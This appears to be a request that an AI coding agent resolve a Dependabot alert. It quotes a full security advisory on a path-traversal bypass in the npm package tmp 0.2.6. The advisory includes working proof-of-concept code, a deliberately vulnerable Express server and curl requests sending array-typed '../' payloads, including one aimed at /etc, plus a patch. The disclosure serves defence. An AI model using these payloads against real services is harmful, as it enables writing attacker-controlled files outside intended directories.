@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** tmp (npm)
- **Severity:** HIGH
- **Vulnerable versions:** >= 0.2.6, < 0.2.7
- **Patched version:** 0.2.7
- **CVE:** CVE-2026-49982
- **GHSA:** GHSA-7c78-jf6q-g5cm
- **Manifest:** pnpm-lock.yaml

**Summary:**
tmp: Type-confusion bypass of _assertPath allows path traversal via non-string prefix/postfix/template

**Description:**
### Summary

The `_assertPath` guard added to `tmp@0.2.6` rejects only string values that contain the substring `..`. It is bypassed when `prefix`, `postfix`, or `template` is supplied as a non-string value (Array, Buffer, or any object) whose `includes('..')` returns falsy but whose stringification still contains `../`. The value flows through `Array.prototype.join`/`String` coercion inside `_generateTmpName` and `path.join(tmpDir, opts.dir, name)`, producing a final path that escapes `tmpdir` and creates a file or directory at an attacker-controlled location with the host process's privileges.

This affects any application that forwards untrusted request data (a common pattern is JSON body fields or `qs`-parsed bracket-array query strings such as `?prefix[]=...`) into `tmp.file`, `tmp.fileSync`, `tmp.dir`, `tmp.dirSync`, `tmp.tmpName`, or `tmp.tmpNameSync` without explicit type coercion.

### Impact

- Arbitrary file creation outside the intended temporary directory, with the running process's filesystem permissions.
- Directory creation outside the intended tree (via `tmp.dir{,Sync}`), which can then host a subsequent symlink swap.
- File content that the application writes to the returned descriptor lands at the attacker's chosen path. In multi-tenant services this crosses tenant boundaries; in CI/build systems it can write into source trees, build outputs, or web roots.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L - score 8.1 (High). Network-reachable when the consumer passes request data unchanged.

### Affected versions

`tmp` >= 0.2.6 (the `_assertPath` guard introduced by commit 7ef2728 / merged in efa4a06f). Earlier releases are vulnerable to the plain string form (already published as a separate advisory) plus this bypass.

### Vulnerable code

`lib/tmp.js` at tag `v0.2.6`, commit 41f7159:

```javascript
// lib/tmp.js:533-539
function _assertPath(path) {
  if (path.includes("..")) {
    throw new Error("Relative value not allowed");
  }

  return path;
}
```

```javascript
// lib/tmp.js:577-580
options.prefix = _isUndefined(options.prefix) ? '' : _assertPath(options.prefix);
options.postfix = _isUndefined(options.postfix) ? '' : _assertPath(options.postfix);
options.template = _isUndefined(options.template) ? undefined : _assertPath(options.template);
```

```javascript
// lib/tmp.js:515-525  - opts.prefix and opts.postfix are stringified by Array.prototype.join
const name = [
  opts.prefix ? opts.prefix : 'tmp',
  '-',
  process.pid,
  '-',
  _randomChars(12),
  opts.postfix ? '-' + opts.postfix : ''
].join('');

return path.join(tmpDir, opts.dir, name);
```

Root cause: `_assertPath` assumes its argument is a string. For an `Array` argument, `Array.prototype.includes('..')` checks element equality (so `['../escape'].includes('..')` is `false`); for an arbitrary object, `Object.prototype.includes` does not exist and a duck-typed `includes: () => false` defeats the check entirely. In both shapes, the subsequent `[...].join('')` and `path.join(...)` coerce the value to its underlying string, which still contains `../`.

### How untrusted data reaches `_assertPath`

Two production-realistic shapes that yield a non-string `prefix`/`postfix`/`template`:

1. JSON request bodies. `express.json()` (and any other JSON body parser) preserves the parsed value's type. A body of `{"prefix":["../escape"]}` reaches the handler as an Array.
2. `qs`-style bracket-array query strings. Express 4's default `qs` parser turns `?prefix[]=../escape` into `['../escape']`. The same applies to any framework using `qs` (Fastify, Koa with bodyparser, Hapi via configured parsers, etc.).

The consumer pattern is the natural one - forward `req.body.prefix` directly into `tmp.file({ prefix, tmpdir })` with no developer-side coercion. The 0.2.6 release notes describe the guard as preventing prefix/postfix traversal, so consumers reasonably believe the guard covers the typical input flow.

### Proof of concept (string vs array)

`poc.js` (run after `npm install tmp@0.2.6`):

```javascript
const tmp = require('tmp');
const path = require('path');
const fs = require('fs');

const baseDir = fs.mkdtempSync('/tmp/safe-base-');

console.log('[negative control] string "../escape" - must be blocked');
try {
  const r = tmp.fileSync({ tmpdir: baseDir, prefix: '../escape' });
  console.log('  UNEXPECTED, file at:', r.name);
  r.removeCallback();
} catch (e) {
  console.log('  BLOCKED as expected:', e.message);
}

console.log('\n[bypass] array ["../escape"] - same effective value, not blocked');
try {
  const r = tmp.fileSync({ tmpdir: baseDir, prefix: ['../escape'] });
  console.log('  CREATED at:', r.name);
  console.log('  ESCAPED:', !path.resolve(r.name).startsWith(path.resolve(baseDir)));
  r.removeCallback();
} catch (e) {
  console.log('  BLOCKED:', e.message);
}

console.log('\n[bypass] duck-typed object {toString, includes} - also not blocked');
try {
  const r = tmp.fileSync({
    tmpdir: baseDir,
    prefix: { toString: () => '../escape', includes: () => false }
  });
  console.log('  CREATED at:', r.name);
  console.log('  ESCAPED:', !path.resolve(r.name).startsWith(path.resolve(baseDir)));
  r.removeCallback();
} catch (e) {
  console.log('  BLOCKED:', e.message);
}
```

Observed output on `tmp@0.2.6`:

```text
[negative control] string "../escape" - must be blocked
  BLOCKED as expected: Relative value not allowed

[bypass] array ["../escape"] - same effective value, not blocked
  CREATED at: /private/tmp/escape-78856-D3p4mEWyapSn
  ESCAPED: true

[bypass] duck-typed object {toString, includes} - also not blocked
  CREATED at: /private/tmp/escape-78856-zP4qXkRm12Lf
  ESCAPED: true
```

### End-to-end reproduction (against the deployed npm package)

Install:

```bash
mkdir tmp-bypass-poc && cd tmp-bypass-poc
npm init -y
npm install tmp@0.2.6 express@5
```

`victim-server.js` - realistic Express app that forwards a JSON body field into `tmp.file`:

```javascript
const express = require('express');
const tmp = require('tmp');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

const TENANT_BASE = fs.mkdtempSync('/tmp/tenant-base-');
console.log('[victim] Tenant base dir:', TENANT_BASE);

app.post('/upload', (req, res) => {
  const userPrefix = req.body.prefix;  // attacker-controlled
  console.log('[victim] received prefix:', JSON.stringify(userPrefix),
              '(type:', Array.isArray(userPrefix) ? 'array' : typeof userPrefix, ')');

  tmp.file({ tmpdir: TENANT_BASE, prefix: userPrefix }, (err, filepath, fd, cleanup) => {
    if (err) {
      console.log('[victim] tmp error:', err.message);
      return res.status(400).json({ error: err.message });
    }
    fs.writeSync(fd, 'attacker-controlled-content');
    fs.closeSync(fd);
    const escaped = !path.resolve(filepath).startsWith(path.resolve(TENANT_BASE));
    console.log('[victim] file created at:', filepath, 'ESCAPED:', escaped);
    res.json({ filepath, escaped, tenantBase: TENANT_BASE });
  });
});

app.listen(3000, () => console.log('[victim] http://127.0.0.1:3000'));
```

Run:

```bash
node victim-server.js &
```

Drive three requests from another shell:

```bash
echo '=== ATTACK 1: string prefix - caught by 0.2.6 ==='
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"prefix":"../escape-string"}' http://127.0.0.1:3000/upload

echo
echo '=== ATTACK 2: array prefix - bypasses 0.2.6 ==='
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"prefix":["../escape-array"]}' http://127.0.0.1:3000/upload

echo
echo '=== ATTACK 3: multi-level traversal toward /etc ==='
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"prefix":["../../../etc/poc-tmp-bypass"]}' http://127.0.0.1:3000/upload
```

Captured transcript (verbatim from the test rig):

```text
=== ATTACK 1: string prefix - caught by 0.2.6 ===
{"error":"Relative value not allowed"}

=== ATTACK 2: array prefix - bypasses 0.2.6 ===
{"filepath":"/private/tmp/escape-array-79635-gEFyGCBNFSTh","escaped":true,"tenantBase":"/tmp/tenant-base-3XHwPZ"}

=== ATTACK 3: multi-level traversal toward /etc ===
{"error":"EACCES: permission denied, open '/etc/poc-tmp-bypass-79635-PEIABptX8JGH'"}
```

Server log:

```text
[victim] Tenant base dir: /tmp/tenant-base-3XHwPZ
[victim] received prefix: "../escape-string" (type: string )
[victim] tmp error: Relative value not allowed
[victim] received prefix: ["../escape-array"] (type: array )
[victim] file created at: /private/tmp/escape-array-79635-gEFyGCBNFSTh ESCAPED: true
[victim] received prefix: ["../../../etc/poc-tmp-bypass"] (type: array )
[victim] tmp error: EACCES: permission denied, open '/etc/poc-tmp-bypass-79635-PEIABptX8JGH'
```

Observations:

- ATTACK 1 (string `../escape-string`) is rejected at `_assertPath`. The 0.2.6 guard works for plain strings.
- ATTACK 2 (array `["../escape-array"]`) passes the guard and creates a file at `/private/tmp/escape-array-...`, outside the tenant base `/tmp/tenant-base-3XHwPZ`. The file content is `attacker-controlled-content`. Confirmed with `ls`:

```bash
$ ls -la /tmp/escape-array-*
-rw-------@ 1 rick  wheel  27 May 27 20:25 /tmp/escape-array-79635-gEFyGCBNFSTh
$ cat /tmp/escape-array-*
attacker-controlled-content
$ ls -la /tmp/tenant-base-3XHwPZ/
total 0
drwx------ 2 rick  wheel   64 May 27 20:25 .
```

  Tenant base is empty. The escape is complete.

- ATTACK 3 (array `["../../../etc/poc-tmp-bypass"]`) reaches `fs.open` for `/etc/poc-tmp-bypass-...`. The open fails only because of POSIX permissions, not because tmp blocked the path. On a process running as root, or against any world-writable target directory, this would succeed.

### Negative control with patched build

Applying the suggested fix below and re-running ATTACK 2:

```text
=== ATTACK 2: array prefix - after fix ===
{"error":"prefix option must be a string, got \"object\"."}
```

The patched build rejects non-string `prefix`/`postfix`/`template` with a clear type error before the path is constructed.

### Suggested fix

Patch `_assertPath` to require a string argument. The check `value.includes('..')` is sound only over strings; any non-string with a custom or array-element `includes` semantics bypasses it.

```diff
--- a/lib/tmp.js
+++ b/lib/tmp.js
@@ -528,11 +528,14 @@ function _generateTmpName(opts) {
 /**
- * Check the prefix and postfix options
+ * Check the prefix, postfix, and template options
  *
  * `@private`
  */
-function _assertPath(path) {
-  if (path.includes("..")) {
+function _assertPath(option, value) {
+  if (typeof value !== 'string') {
+    throw new Error(`${option} option must be a string, got "${typeof value}".`);
+  }
+  if (value.includes("..")) {
     throw new Error("Relative value not allowed");
   }

-  return path;
+  return value;
 }
@@ -575,9 +578,9 @@ function _assertOptionsBase(options) {
   options.unsafeCleanup = !!options.unsafeCleanup;

   // for completeness' sake only, also keep (multiple) blanks if the user, purportedly sane, requests us to
-  options.prefix = _isUndefined(options.prefix) ? '' : _assertPath(options.prefix);
-  options.postfix = _isUndefined(options.postfix) ? '' : _assertPath(options.postfix);
-  options.template = _isUndefined(options.template) ? undefined : _assertPath(options.template);
+  options.prefix = _isUndefined(options.prefix) ? '' : _assertPath('prefix', options.prefix);
+  options.postfix = _isUndefined(options.postfix) ? '' : _assertPath('postfix', options.postfix);
+  options.template = _isUndefined(options.template) ? undefined : _assertPath('template', options.template);
 }
```

Defence-in-depth, recommended in addition to the type check: validate the final resolved path against `tmpdir` after `_generateTmpName`, similar to what `_getRelativePath` already does for `dir` and `template`. That way any future bypass through a different vector (e.g., a future Node `path` change, or a different option) does not exit `tmpdir`.

### Fix PR

https://github.com/raszi/node-tmp-ghsa-7c78-jf6q-g5cm/pull/1

### Credit

Reported by tonghuaroot.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2085)
